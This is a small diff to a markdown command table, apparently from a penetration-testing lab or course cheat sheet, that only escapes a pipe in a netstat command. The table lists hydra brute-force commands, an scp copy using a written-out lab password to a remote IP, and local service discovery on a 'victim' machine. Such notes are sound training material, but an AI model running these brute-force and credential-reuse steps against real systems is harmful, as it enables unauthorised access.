@@ -59,6 +59,6 @@ hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Pa
 | `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
 | `ftp 127.0.0.1` | FTP to Server |
 | `su - user` | Switch to User |
-| `netstat -antp | grep -i list` | Identify internal network services and their ports running on the local victim machine. |
+| `netstat -antp \| grep -i list` | Identify internal network services and their ports running on the local victim machine. |
 | `scp -P 53718 ./william.txt b.gates@83.136.251.221:/tmp` | Use SCP with the obtain credentials for user `b.gates` and password `4dn1l3M!$` to copy the files to target. |
 | `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | Use `hydra` on the victim locally to identify password of user against internal FTP service. |
